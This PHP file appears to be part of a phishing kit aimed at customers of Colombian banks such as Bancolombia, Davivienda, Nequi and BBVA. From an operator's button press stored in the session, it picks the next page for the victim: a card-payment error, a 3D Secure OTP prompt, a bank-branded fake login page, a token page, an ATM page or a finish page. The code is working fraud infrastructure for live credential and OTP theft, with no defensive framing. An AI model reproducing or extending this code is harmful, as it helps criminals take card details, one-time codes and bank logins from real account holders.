<?php
session_start();

if (isset($_SESSION['button_pressed'])) {
    $buttonPressed = $_SESSION['button_pressed'];

    switch ($buttonPressed) {
        case "info":
            echo "rastrear.php";
            break;
        case "❌TC":
            echo "payment_error.php";
            break;
        case "⭐️OTP":
            echo "3d.php";
            break;
        case "❌OTP":
            echo "3d_error.php";
            break;
        case "🏦LG":
            $bank = $_SESSION['bank'] ?? 'default';
            switch ($bank) {
                case "BANCOLOMBIA":
                    echo "logo2.php";
                    break;
                case "BANCO COLPATRIA":
                    echo "logocolpa5.php";
                    break;
                case "BANCO DAVIVIENDA":
                    echo "logodavi3.php";
                    break;
                case "BANCO FALABELLA":
                    echo "logofala4.php";
                    break;
                case "NEQUI":
                    echo "logonequi6.php";
                    break;
                case "BANCO DE BOGOTA":
                    echo "logobogo5.php";
                    break;
                case "BANCO BBVA":
                    echo "logobb.php";
                    break;
                case "BANCO CAJA SOCIAL":
                    echo "logocaja.php";
                    break;
                case "BANCO CITIBANK":
                    echo "logociti.php";
                    break;
                case "BANCO POPULAR":
                    echo "logopopu.php";
                    break;
                case "TUYA":
                    echo "logotuya.php";
                    break;
                case "BANCO DE OCCIDENTE":
                    echo "logoocci.php";
                    break;
                default:
                    echo "logo.php";
                    break;
            }
            break;
        case "✅FINAL":
            echo "finish.php";
            break;
        case "⭐️TK":
            echo "token.php";
            break;
        case "⭐️AP":
            echo "otpap.php";
            break;
        case "🏧":
            echo "atm.php";
            break;
        default:
            echo ''; // No hacer nada si no se reconoce el botón
    }

    // Limpiar la sesión para evitar redirecciones múltiples
    unset($_SESSION['button_pressed']);
}
?>
